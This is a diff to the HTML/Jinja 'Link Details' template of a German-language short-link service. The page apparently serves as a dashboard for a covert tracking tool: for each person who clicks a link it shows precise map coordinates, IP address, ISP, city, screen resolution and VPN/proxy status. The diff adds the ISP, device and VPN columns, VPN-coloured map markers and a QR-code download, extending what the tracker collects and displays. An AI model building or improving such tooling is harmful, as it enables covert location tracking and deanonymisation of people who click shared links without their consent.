@@ -11,34 +11,38 @@
                     <i class="fas fa-info-circle me-2"></i>Link Details
                 </h2>
                 <a href="{{ url_for('dashboard') }}" class="btn btn-outline-light">
-                    <i class="fas fa-arrow-left me-2"></i>Zurück zum Dashboard
+                    <i class="fas fa-arrow-left me-2"></i>Dashboard
                 </a>
             </div>
 
-            <!-- Link Info -->
             <div class="card mb-4">
                 <div class="card-body">
-                    <h4 class="card-title">{{ link.title }}</h4>
-                    {% if link.description %}
-                    <p class="card-text">{{ link.description }}</p>
-                    {% endif %}
-                    
-                    <div class="row">
-                        <div class="col-md-6">
+                    <div class="row align-items-start">
+                        <div class="col-md-9">
+                            <h4>{{ link.title }}</h4>
+                            {% if link.description %}
+                            <p class="text-muted">{{ link.description }}</p>
+                            {% endif %}
                             <p><strong>Ziel-URL:</strong><br>
                             <a href="{{ link.original_url }}" target="_blank" class="text-break">{{ link.original_url }}</a></p>
-                        </div>
-                        <div class="col-md-6">
                             <p><strong>Kurzlink:</strong><br>
-                            <code>{{ url_for('redirect_link', short_code=link.short_code, _external=True) }}</code>
-                            <button class="btn btn-sm btn-outline-primary ms-2" 
-                                    onclick="copyLink('{{ url_for('redirect_link', short_code=link.short_code, _external=True) }}')">
+                            <code>{{ short_url }}</code>
+                            <button class="btn btn-sm btn-outline-primary ms-2" onclick="copyLink('{{ short_url }}')">
                                 <i class="fas fa-copy"></i>
                             </button></p>
                         </div>
+                        <div class="col-md-3 text-center">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={{ short_url|urlencode }}" 
+                                 alt="QR" class="img-fluid" style="max-width: 150px;">
+                            <br>
+                            <a href="https://api.qrserver.com/v1/create-qr-code/?size=2000x2000&data={{ short_url|urlencode }}" 
+                               class="btn btn-sm btn-outline-dark mt-2" download>
+                                <i class="fas fa-download me-1"></i>QR download
+                            </a>
+                        </div>
                     </div>
-                    
-                    <div class="row text-center">
+
+                    <div class="row text-center mt-3">
                         <div class="col-md-3">
                             <div class="stats-card">
                                 <h3>{{ link.clicks }}</h3>
@@ -52,15 +56,15 @@
                             </div>
                         </div>
                         <div class="col-md-3">
-                            <div class="stats-card">
-                                <h3>{{ link.created_at.strftime('%d.%m') }}</h3>
-                                <p>Erstellt am</p>
+                            <div class="stats-card {% if conversion_rate >= 50 %}bg-success{% endif %}">
+                                <h3>{{ conversion_rate }}%</h3>
+                                <p>Conversion</p>
                             </div>
                         </div>
                         <div class="col-md-3">
                             <div class="stats-card">
-                                <h3>{{ link.creator_ip or 'N/A' }}</h3>
-                                <p>Ersteller-IP</p>
+                                <h3>{{ vpn_count }}</h3>
+                                <p>VPN/Proxy</p>
                             </div>
                         </div>
                     </div>
@@ -71,7 +75,7 @@
             <!-- Map -->
             <div class="card mb-4">
                 <div class="card-body">
-                    <h5 class="card-title">
+                    <h5>
                         <i class="fas fa-map me-2"></i>Kartenansicht
                     </h5>
                     <div id="map" style="height: 400px; border-radius: 10px;"></div>
@@ -81,7 +85,7 @@
             <!-- Locations Table -->
             <div class="card">
                 <div class="card-body">
-                    <h5 class="card-title">
+                    <h5>
                         <i class="fas fa-list me-2"></i>Standortliste
                     </h5>
                     <div class="table-responsive">
@@ -91,8 +95,11 @@
                                     <th>Zeit</th>
                                     <th>Koordinaten</th>
                                     <th>Genauigkeit</th>
-                                    <th>IP-Adresse</th>
-                                    <th>Zusatzinfo</th>
+                                    <th>IP</th>
+                                    <th>ISP</th>
+                                    <th>Ort</th>
+                                    <th>Gerät</th>
+                                    <th>VPN</th>
                                 </tr>
                             </thead>
                             <tbody>
@@ -101,26 +108,30 @@
                                     <td>{{ location.timestamp.strftime('%d.%m.%Y %H:%M:%S') }}</td>
                                     <td>
                                         {% if location.latitude and location.longitude %}
-                                        <a href="https://www.google.com/maps?q={{ location.latitude }},{{ location.longitude }}" 
-                                           target="_blank">
-                                            {{ "%.6f"|format(location.latitude) }}, {{ "%.6f"|format(location.longitude) }}
+                                        <a href="https://www.google.com/maps?q={{ location.latitude }},{{ location.longitude }}" target="_blank">
+                                            {{ "%.4f"|format(location.latitude) }}, {{ "%.4f"|format(location.longitude) }}
                                         </a>
-                                        {% else %}
-                                        <span class="text-muted">Nicht vorhanden</span>
-                                        {% endif %}
+                                        {% else %}<span class="text-muted">–</span>{% endif %}
                                     </td>
-                                    <td>
-                                        {% if location.accuracy %}
-                                        {{ "%.0f"|format(location.accuracy) }}m
-                                        {% else %}
-                                        <span class="text-muted">N/A</span>
-                                        {% endif %}
-                                    </td>
-                                    <td>{{ location.ip_address or 'N/A' }}</td>
+                                    <td>{% if location.accuracy %}{{ "%.0f"|format(location.accuracy) }}m{% else %}–{% endif %}</td>
+                                    <td><code class="small">{{ location.ip_address or '–' }}</code></td>
+                                    <td>{{ location.isp or '–' }}</td>
                                     <td>
                                         {% if location.city %}{{ location.city }}{% endif %}
                                         {% if location.country %}, {{ location.country }}{% endif %}
-                                        {% if not location.city and not location.country %}N/A{% endif %}
+                                        {% if not location.city and not location.country %}–{% endif %}
+                                    </td>
+                                    <td>
+                                        {% if location.screen_resolution %}
+                                        <span class="badge bg-secondary">{{ location.screen_resolution }}</span>
+                                        {% else %}–{% endif %}
+                                    </td>
+                                    <td>
+                                        {% if location.vpn %}
+                                        <span class="badge bg-danger"><i class="fas fa-shield-alt me-1"></i>VPN</span>
+                                        {% else %}
+                                        <span class="badge bg-success">Nein</span>
+                                        {% endif %}
                                     </td>
                                 </tr>
                                 {% endfor %}
@@ -134,7 +145,7 @@
                 <div class="card-body py-5">
                     <i class="fas fa-map-marker-alt fs-1 text-muted mb-4"></i>
                     <h4>Noch keine Standortdaten</h4>
-                    <p class="text-muted">Sobald jemand auf den Link klickt, werden die Standorte hier angezeigt</p>
+                    <p class="text-muted">Sobald jemand auf den Link klickt, werden die Daten hier angezeigt</p>
                 </div>
             </div>
             {% endif %}
@@ -148,7 +159,6 @@
 <script async defer 
         src="https://maps.googleapis.com/maps/api/js?key={{ google_maps_api_key }}&callback=initMap">
 </script>
-
 <script>
 function initMap() {
     const map = new google.maps.Map(document.getElementById('map'), {
@@ -165,7 +175,9 @@ function initMap() {
             lng: {{ location.longitude }},
             timestamp: '{{ location.timestamp.strftime("%d.%m.%Y %H:%M:%S") }}',
             accuracy: {{ location.accuracy or 0 }},
-            ip: '{{ location.ip_address or "N/A" }}'
+            ip: '{{ location.ip_address or "N/A" }}',
+            isp: '{{ (location.isp or "N/A")|e }}',
+            vpn: {{ 'true' if location.vpn else 'false' }}
         },
         {% endif %}
         {% endfor %}
@@ -174,54 +186,41 @@ function initMap() {
     if (locations.length > 0) {
         const bounds = new google.maps.LatLngBounds();
         
-        locations.forEach(function(location, index) {
+        locations.forEach(function(loc, i) {
             const marker = new google.maps.Marker({
-                position: { lat: location.lat, lng: location.lng },
+                position: { lat: loc.lat, lng: loc.lng },
                 map: map,
-                title: 'Standort ' + (index + 1),
-                icon: {
-                    url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png'
-                }
+                title: 'Standort ' + (i + 1),
+                icon: { url: loc.vpn ? 'https://maps.google.com/mapfiles/ms/icons/yellow-dot.png' : 'https://maps.google.com/mapfiles/ms/icons/red-dot.png' }
             });
 
-            const infoWindow = new google.maps.InfoWindow({
-                content: `
-                    <div>
-                        <h6>Standort ${index + 1}</h6>
-                        <p><strong>Zeit:</strong> ${location.timestamp}</p>
-                        <p><strong>Koordinaten:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}</p>
-                        <p><strong>Genauigkeit:</strong> ${location.accuracy}m</p>
-                        <p><strong>IP:</strong> ${location.ip}</p>
-                    </div>
-                `
+            const info = new google.maps.InfoWindow({
+                content: '<div><h6>Standort ' + (i + 1) + '</h6>' +
+                    '<p><strong>Zeit:</strong> ' + loc.timestamp + '</p>' +
+                    '<p><strong>Koords:</strong> ' + loc.lat.toFixed(4) + ', ' + loc.lng.toFixed(4) + '</p>' +
+                    '<p><strong>Genauigkeit:</strong> ' + loc.accuracy + 'm</p>' +
+                    '<p><strong>IP:</strong> ' + loc.ip + '</p>' +
+                    '<p><strong>ISP:</strong> ' + loc.isp + '</p>' +
+                    (loc.vpn ? '<p><span class=\\"badge bg-danger\\">VPN</span></p>' : '') +
+                    '</div>'
             });
 
-            marker.addListener('click', function() {
-                infoWindow.open(map, marker);
-            });
-
+            marker.addListener('click', function() { info.open(map, marker); });
             bounds.extend(marker.getPosition());
         });
 
-        if (locations.length === 1) {
-            map.setCenter(bounds.getCenter());
-            map.setZoom(15);
-        } else {
-            map.fitBounds(bounds);
-        }
+        locations.length === 1 ? (map.setCenter(bounds.getCenter()), map.setZoom(15)) : map.fitBounds(bounds);
     }
 }
 
 function copyLink(url) {
     navigator.clipboard.writeText(url).then(function() {
         const btn = event.target.closest('button');
-        const originalHtml = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-check"></i>';
         btn.classList.remove('btn-outline-primary');
         btn.classList.add('btn-success');
-        
         setTimeout(function() {
-            btn.innerHTML = originalHtml;
+            btn.innerHTML = '<i class="fas fa-copy"></i>';
             btn.classList.remove('btn-success');
             btn.classList.add('btn-outline-primary');
         }, 2000);
